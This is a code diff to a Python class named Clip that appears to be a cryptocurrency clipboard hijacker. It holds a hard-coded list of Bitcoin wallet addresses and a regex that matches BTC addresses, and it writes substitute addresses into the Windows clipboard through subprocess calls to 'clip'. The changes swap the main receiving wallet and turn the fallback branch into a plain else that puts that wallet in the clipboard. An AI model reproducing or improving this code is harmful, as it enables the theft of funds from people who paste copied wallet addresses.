@@ -20,7 +20,7 @@ class Clip:
     '''
 
     def __init__(self):
-        self.wallets = ['bc1q53g2ncpm78nn2y832sfqjdqlp06z9nz93aqfav'] #First address should be the MAIN BTC address
+        self.wallets = ['36AQZhpMzMfvC3cGuDPKdWdDntnMgBywLT'] #First address should be the MAIN BTC address
         self.address_regex = r'\b(bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|[13][a-km-zA-HJ-NP-Z1-9]{25,35})\b'
 
     def closest_match(self, address):
@@ -43,7 +43,7 @@ class Clip:
                     if address_matches:
                         subprocess.Popen(['clip'], shell=True, stdin=subprocess.PIPE, encoding='utf8').communicate(address_matches[0].strip())
 
-                    elif not address_matches:
+                    else:
                         subprocess.Popen(['clip'], shell=True, stdin=subprocess.PIPE, encoding='utf8').communicate(self.wallets[0].strip())
 
             except Exception:
